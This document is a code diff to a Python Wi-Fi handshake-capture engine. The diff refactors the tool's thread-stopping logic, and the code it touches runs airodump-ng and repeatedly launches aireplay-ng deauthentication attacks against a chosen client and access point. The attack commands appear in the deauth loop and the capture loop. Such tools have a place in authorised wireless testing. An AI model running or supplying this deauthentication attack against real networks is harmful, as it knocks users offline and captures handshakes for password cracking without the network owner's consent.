@@ -16,21 +16,19 @@ class HandshakeCaptureEngine:
         self.on_log = on_log
         self.on_success = on_success
         self.airodump_proc = None
-        self.running = False
+        self.stop_event = threading.Event()
         self.captured = False
 
     def start(self):
-        self.running = True
+        self.stop_event.clear()
         self.on_log(f"[*] Starting handshake capture on {self.essid}...")
-        
         self.dump_thread = threading.Thread(target=self._airodump_loop, daemon=True)
-        self.dump_thread.start()
-        
         self.deauth_thread = threading.Thread(target=self._deauth_loop, daemon=True)
+        self.dump_thread.start()
         self.deauth_thread.start()
 
     def stop(self):
-        self.running = False
+        self.stop_event.set()
         if self.airodump_proc:
             self.airodump_proc.terminate()
             self.airodump_proc.wait()
@@ -46,7 +44,7 @@ class HandshakeCaptureEngine:
         self.airodump_proc = subprocess.Popen(cmd, stdout=slave, stderr=slave, text=True)
         os.close(slave)
         
-        while self.running and not self.captured:
+        while not self.stop_event.is_set() and not self.captured:
             rlist, _, _ = select.select([master], [], [], 1.0)
             if rlist:
                 try:
@@ -65,19 +63,21 @@ class HandshakeCaptureEngine:
             self.airodump_proc.wait()
 
     def _deauth_loop(self):
-        while self.running and not self.captured:
+        while not self.stop_event.is_set() and not self.captured:
             self.on_log(f"[*] Sending Deauth to {self.client_mac} for 10 seconds...")
             cmd = ["aireplay-ng", "--deauth", "0", "-a", self.bssid, "-c", self.client_mac, self.interface]
-            
             try:
                 proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-                time.sleep(10)
+                if self.stop_event.wait(10): 
+                    proc.terminate()
+                    proc.wait()
+                    break
                 if proc.poll() is None:
                     proc.terminate()
                     proc.wait()
             except Exception as e:
                 self.on_log(f"[-] Deauth error: {e}")
             
-            if not self.captured and self.running:
-                self.on_log("[*] Pausing deauth for 2 seconds to check for handshake...")
-                time.sleep(5)
+            if not self.captured and not self.stop_event.is_set():
+                self.on_log("[*] Pausing deauth for 5 seconds to check for handshake...")
+                self.stop_event.wait(5)
